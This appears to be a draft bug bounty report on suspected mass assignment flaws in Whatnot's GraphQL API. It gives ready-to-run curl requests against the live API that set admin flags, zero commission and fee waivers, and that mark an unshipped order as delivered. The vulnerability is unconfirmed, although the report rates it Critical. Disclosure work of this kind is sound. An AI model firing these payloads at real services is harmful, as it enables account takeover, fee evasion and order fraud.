# HackerOne Submission — Mass Assignment via GraphQL Mutations (Privilege Escalation)

**Program:** Whatnot  
**Weakness:** Mass Assignment / Privilege Escalation  
**Severity:** Critical  
**Asset:** api.whatnot.com  

---

## Summary

GraphQL mutations that accept open input objects may be vulnerable to mass assignment — accepting fields that should not be user-controllable such as `isAdmin`, `isTrustedSeller`, `commissionRate`, `sellerApproved`, or `accountStatus`. In Absinthe (Elixir), this occurs when input type definitions use permissive casting without an explicit field whitelist. A buyer can potentially elevate their account to seller/admin status, set their commission rate to 0%, or mark orders as fulfilled without shipping anything.

---

## Steps to Reproduce

### Step 1 — Enumerate available mutations

First use field suggestions (see Finding #09) or authenticated introspection to list mutations:

```bash
# If introspection is on:
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}'
```

Focus on mutations like: `updateUser`, `updateProfile`, `updateSellerSettings`, `updateProduct`, `updateOrder`, `createListing`.

---

### Step 2 — Test mass assignment on user profile update

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation UpdateProfile($input: UpdateUserInput!) { updateUser(input: $input) { user { id username isAdmin isTrustedSeller sellerApproved commissionRate } } }",
    "variables": {
      "input": {
        "firstName": "Test",
        "lastName": "User",
        "isAdmin": true,
        "isTrustedSeller": true,
        "sellerApproved": true,
        "commissionRate": 0.001,
        "accountStatus": "ACTIVE",
        "isBanned": false
      }
    }
  }'
```

**Check the response:** If `isAdmin`, `isTrustedSeller`, or `commissionRate` appear in the result with the values you set, mass assignment is confirmed.

---

### Step 3 — Test mass assignment on seller settings

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateSellerSettings(input: { commissionRate: 0.001, isTrustedSeller: true, canGoLive: true, maxConcurrentListings: 99999, verificationLevel: \"VERIFIED\", feeOverride: 0.0 }) { seller { commissionRate isTrustedSeller verificationLevel } } }"
  }'
```

---

### Step 4 — Test mass assignment on product/listing creation

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation CreateProduct($input: CreateProductInput!) { createProduct(input: $input) { product { id price commissionRate isApproved isFeatured } } }",
    "variables": {
      "input": {
        "title": "Test Product",
        "price": 0.01,
        "commissionRate": 0.0,
        "isApproved": true,
        "isFeatured": true,
        "categoryOverride": "PREMIUM",
        "feeWaived": true
      }
    }
  }'
```

---

### Step 5 — Test order status manipulation

```bash
# Try to mark an order as delivered without actually shipping
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateOrder(id: \"ORDER_ID\", input: { status: \"DELIVERED\", trackingNumber: \"FAKE123\", fulfilledAt: \"2026-01-01T00:00:00Z\", buyerConfirmed: true }) { order { id status fulfilledAt } } }"
  }'
```

---

### Step 6 — Verify persistence

After running the mutation, query your own account to confirm changes persisted:

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ me { id username isAdmin isTrustedSeller sellerApproved commissionRate } }"}'
```

---

## Expected Result

Extra fields like `isAdmin`, `commissionRate`, `isTrustedSeller` should be silently ignored or return an error:
```json
{"errors": [{"message": "Unknown argument 'isAdmin' on field 'UpdateUserInput'"}]}
```

## Actual Result (if vulnerable)

The mutation succeeds and the restricted fields are updated to attacker-supplied values.

---

## Impact

| Exploited Field | Impact |
|---|---|
| `isAdmin: true` | Full platform admin access — ban users, access all data, modify any order |
| `commissionRate: 0.001` | Sell items paying <0.1% fee instead of standard 8–12% |
| `isTrustedSeller: true` | Skip seller verification, access premium seller features |
| `sellerApproved: true` | Bypass seller onboarding to immediately start selling |
| `order.status: DELIVERED` | Fraudulent refund avoidance — mark unshipped orders as delivered |
| `feeWaived: true` | Eliminate seller fees on transactions |

---

## Recommended Fix

- Define strict input type whitelists in Absinthe — only allow fields that are explicitly permitted in `input_object` definitions
- Never use `cast(attrs, :all_fields)` — enumerate permitted fields explicitly
- Validate that field values match expected ranges server-side (e.g., `commissionRate` must be within platform-defined bounds, not user-supplied)
- Add server-side checks: `if Map.has_key?(input, :is_admin), raise :unauthorized`
- Reference: [OWASP Mass Assignment](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
